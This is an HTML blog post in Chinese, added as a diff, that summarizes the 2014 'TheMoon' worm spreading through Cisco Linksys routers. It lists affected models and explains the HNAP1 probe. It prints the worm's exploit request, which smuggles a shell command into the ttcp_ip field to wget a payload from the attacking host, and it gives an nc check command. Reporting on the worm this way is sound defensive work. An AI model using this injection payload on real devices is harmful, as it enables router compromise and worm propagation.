@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>Cisco Linksys路由器蠕虫The Moon正在蔓延</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>Cisco Linksys路由器蠕虫The Moon正在蔓延</h2>
+	<p class="meta">2014-02-15</p>
+
+	<div class="post">
+	        <p></p>
+<p style="text-align: center;"><img data-original="/imgs/dde595119dd8506ebedc42b9169486e0.jpg!small" src="/imgs/dde595119dd8506ebedc42b9169486e0.jpg!small" title="E4200_Photo01.jpg"></p>
+<noscript><img src="/imgs/dde595119dd8506ebedc42b9169486e0.jpg!small" title="E4200_Photo01.jpg"></noscript>
+<p>作为互联网的入口，家用路由器越来越被业界所重视。路由器更加智能了，路由器的安全也会更加多样化。近日，国外安全研究者发布<a href="https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633">Linksys路由器蠕虫预警</a>。根据路由器的固件版本，<strong>Cisco </strong><strong>Linksys E4200, E3200, E3000, E2500, E2100L, E2000, E1550, E1500, E1200, E1000,E900等型号存在被蠕虫感染的风险。</strong></p>
+<p>这个蠕虫首先连接路由器的8080端口，请求“/HNAP1/”这个路径。linksys路由器会返回一个包含路由器特性和固件版本的xml文档。</p>
+<pre style="margin-top: 1em; margin-bottom: 1.5em; padding: 0.5em 1em; font-size: 0.75em; line-height: 1.5em; color: rgb(17, 17, 17); background-color: rgb(255, 255, 240); border: 1px solid rgb(221, 221, 204); overflow: hidden; box-shadow: rgb(204, 204, 204) 1px 1px 6px; -webkit-box-shadow: rgb(204, 204, 204) 1px 1px 6px;" class="brush:cpp;toolbar:false;">&lt;ModelName&gt;E2500&lt;/ModelName&gt;
+&lt;FirmwareVersion&gt;1.0.07 build 1&lt;/FirmwareVersion&gt;</pre>
+<p>这是E2500型号返回的固件相关信息。之后，蠕虫会发送一个特定的请求到存在漏洞的路由器，这个请求会导致路由器执行一段shell脚本，从而感染蠕虫。第二次的请求如下：</p>
+<pre style="margin-top: 1em; margin-bottom: 1.5em; padding: 0.5em 1em; font-size: 0.75em; line-height: 1.5em; color: rgb(17, 17, 17); background-color: rgb(255, 255, 240); border: 1px solid rgb(221, 221, 204); overflow: hidden; box-shadow: rgb(204, 204, 204) 1px 1px 6px; -webkit-box-shadow: rgb(204, 204, 204) 1px 1px 6px;" class="brush:cpp;toolbar:false;">submit_button=&amp;change_action=&amp;submit_type=&amp;action=&amp;commit=0&amp;ttcp_num=2&amp;ttcp_size=2
+&amp;ttcp_ip=-h
+`cd /tmp;if [ ! -e .L26 ];then wget http://[source IP]:193/0Rx.mid;fi`
+&amp;StartEPI=1</pre>
+<p>一旦被蠕虫感染，路由器就会扫描其他的ip，这个蠕虫内置了大约670个不同国家的家用网段。而且被感染的路由器在短时间内会作为http服务器供其他被感染的路由器下载蠕虫代码。目前尚不清楚这个蠕虫网络是否存在命令和控制频道。当前它的行为仅仅是传播。研究者在蠕虫的文件中发现了电影<a href="http://www.imdb.com/title/tt1182345/">《The Moon》</a>的相关图片，所以被命名为The Moon。</p>
+<p>可以通过以下命令来检测自己的路由器是否存在漏洞：</p>
+<pre style="margin-top: 1em; margin-bottom: 1.5em; padding: 0.5em 1em; font-size: 0.75em; line-height: 1.5em; color: rgb(17, 17, 17); background-color: rgb(255, 255, 240); border: 1px solid rgb(221, 221, 204); overflow: hidden; box-shadow: rgb(204, 204, 204) 1px 1px 6px; -webkit-box-shadow: rgb(204, 204, 204) 1px 1px 6px;">echo "GET /HNAP1/ HTTP/1.1\r\nHost: test\r\n\r\n" | nc routerip 8080</pre>
+<p>如果或得了xml格式的返回数据，那么你的路由器很可能存在漏洞，有被蠕虫感染的风险。</p>
+<p>[编译整理by litdg@freebuf]</p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
